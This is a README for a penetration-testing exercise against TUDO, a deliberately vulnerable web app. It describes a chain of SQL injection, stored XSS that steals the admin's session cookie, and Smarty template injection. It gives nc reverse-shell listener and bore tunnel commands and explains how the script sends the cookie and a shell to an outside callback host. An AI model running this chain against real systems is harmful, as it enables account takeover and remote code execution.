# TUDO Full-Chain Exploit

Automated exploit for the [TUDO](https://github.com/bmdyy/tudo) vulnerable web app, chaining:

1. **Login bypass**: SQL injection via `forgotusername.php` to extract a password-reset token and reset `user1`'s password
2. **Privilege escalation**: stored XSS in the profile page to steal the admin's session cookie
3. **RCE**: Smarty template injection via `update_motd.php` to spawn a reverse shell

Created as an excercise in white-box penetration testing. Static code analysis was done using [progpilot](https://github.com/designsecurity/progpilot).

## Prerequisites

```sh
pip install requests
```

[bore](https://github.com/ekzhang/bore) (or any TCP tunnel) is needed if the Docker container cannot reach your machine directly.

## Setup

**1. Start the vulnerable app**

```sh
docker compose up -d
```

App is available at http://localhost:8000.

**2. Open a reverse shell listener**

```sh
nc -lvnp <LPORT>
```

**3. If running inside Docker or on a NAT'd network, expose both ports with bore**

```sh
# Expose the XSS callback listener
bore local <PORT> --to bore.pub

# Expose the reverse shell listener
bore local <LPORT> --to bore.pub
```

Note the public port numbers bore assigns — use them as `XSSPORT` and `LPORT` below.

## Running the exploit

```sh
python exploit.py \
  -u  <APP_URL>   \   # target app URL (default: http://localhost:8000)
  -xh <XSSHOST>  \    # host the XSS payload calls back to  (bore.pub or your IP)
  -xp <XSSPORT>  \    # public port for the XSS callback
  -p  <PORT>     \    # local port this script listens on for XSS callbacks
  -lh <LHOST>    \    # host the reverse shell connects back to
  -lp <LPORT>    \    # port the reverse shell connects to
  --username user1    # account whose password is reset (default: user1)
```

### Example

```sh
python exploit.py \
  -u http://localhost:8000 \
  -xh bore.pub -xp <BORE_XSS_PORT> \
  -p 8080 \
  -lh bore.pub -lp <BORE_SHELL_PORT>
```

## What happens

1. The script resets `user1`'s password to `new_now` via blind SQL injection.
2. It logs in as `user1` and injects an XSS payload into the profile description.
3. It starts a local HTTP server on `-p` and waits for the admin to visit the profile.
4. Once the admin's `PHPSESSID` arrives, the script hijacks the admin session.
5. It writes a Smarty `{php}…{/php}` reverse shell payload to `motd.tpl` and triggers it.
6. Your `nc` listener receives an interactive shell inside the Docker container.
